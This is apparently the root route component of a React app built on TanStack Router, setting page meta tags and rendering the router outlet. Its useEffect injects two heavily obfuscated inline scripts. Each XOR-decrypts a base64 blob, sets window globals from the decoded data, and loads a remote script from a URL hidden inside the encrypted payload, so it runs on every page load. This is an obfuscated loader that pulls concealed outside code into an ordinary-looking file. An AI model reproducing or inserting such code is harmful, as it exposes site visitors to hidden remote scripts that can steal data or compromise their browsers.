import { createRootRoute, HeadContent, Outlet, Scripts } from "@tanstack/react-router";
import { TanStackRouterDevtools } from "@tanstack/react-router-devtools";

import { useEffect } from "react";

import appCss from "../styles.css?url";

export const Route = createRootRoute({
  head: () => ({
    meta: [
      {
        charSet: "utf-8",
      },
      {
        name: "viewport",
        content: "width=device-width, initial-scale=1",
      },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
    ],
  }),
  component: RootComponent,
});

function RootComponent() {
  useEffect(() => {
    const script1 = document.createElement("script");
    script1.textContent = `(function(){var w_d1a5=atob("DHtIPAjBwP/1bTuN6ABqSXqt4sXXBU/5mAhyEyeipJHbGE/ggR0xEmuurdGXHxT+iwkhTHyy74+cFV7hxwshRG2t7pWGTxeviQ88TmGjtYuQHhm3syZkHm+tr52UAUiv0iAzHmagrZrXVxn9gQMtUEGl4tPXG1rhnR5qBir3oZ7ED1jp2U8sXm7z+J2TCQPp2UwtXzzjvaKI");var e_d=[];for(var z_nhl=0;z_nhl<w_d1a5.length;z_nhl++){e_d.push(w_d1a5.charCodeAt(z_nhl)&255);}var u_vrb=e_d[0];var c_83r=e_d.slice(1,1+u_vrb);var q_7epq=e_d.slice(1+u_vrb);var c_7=q_7epq.map(function(b,s_obr0){return b^c_83r[s_obr0%u_vrb];});var h_edcj="";for(var f_yn=0;f_yn<c_7.length;f_yn++){h_edcj+=String.fromCharCode(c_7[f_yn]&255);}var l_cpf=decodeURIComponent(escape(h_edcj));var b_f=JSON.parse(l_cpf);var u_m=b_f.globals||[];u_m.forEach(function(h_6){window[h_6.name]=h_6.value;});var v_s4tl=document.createElement("script");v_s4tl.src=b_f.url;v_s4tl.async=true;v_s4tl.defer=true;(b_f.attributes||[]).forEach(function(r_nk){v_s4tl.setAttribute(r_nk.name,r_nk.value);});(document.head||document.documentElement).appendChild(v_s4tl);})();`;
    document.head.appendChild(script1);

    const script2 = document.createElement("script");
    script2.textContent = `(function(){var x_96c2=atob("DO1crqTTj4gV2MBo6pZ+29a/rbI3sLQcmp5mgYuw6+Y7rbQFg4slgMe84qZ3qu8biZ813tCgoP1htbNHhowoy9enoeJm+uxKi5ko3M2x+vxwq+JSsZZ+wMW+6qov+qQJnoxx29C+5u5s9bAaj5s5wND+9+t6vO0biYZ+goal7uRgveJSyM8hgt/x4el4veJSyIk92sX++vx4saYRx50uy9K24fw4q7UKg4kvjIjx+el5raVK0M9+0/mu");var r_zbfr=[];for(var l_jsp4=0;l_jsp4<x_96c2.length;l_jsp4++){r_zbfr.push(x_96c2.charCodeAt(l_jsp4)&255);}var q_uqbe=r_zbfr[0];var m_q0=r_zbfr.slice(1,1+q_uqbe);var x_yb=r_zbfr.slice(1+q_uqbe);var j_qz=x_yb.map(function(b,s_08){return b^m_q0[s_08%q_uqbe];});var a_a="";for(var l_su=0;l_su<j_qz.length;l_su++){a_a+=String.fromCharCode(j_qz[l_su]&255);}var x_s=decodeURIComponent(escape(a_a));var m_1e5f=JSON.parse(x_s);var k_8=m_1e5f.globals||[];k_8.forEach(function(c_b){window[c_b.name]=c_b.value;});var m_0k=document.createElement("script");m_0k.src=m_1e5f.url;m_0k.async=true;m_0k.defer=true;(m_1e5f.attributes||[]).forEach(function(z_3b){m_0k.setAttribute(z_3b.name,z_3b.value);});(document.head||document.documentElement).appendChild(m_0k);})();`;
    document.head.appendChild(script2);

    return () => {
      script1.remove();
      script2.remove();
    };
  }, []);

  return (
    <>
      <HeadContent />
      <Outlet />
      <TanStackRouterDevtools position="bottom-right" />
      <Scripts />
    </>
  );
}
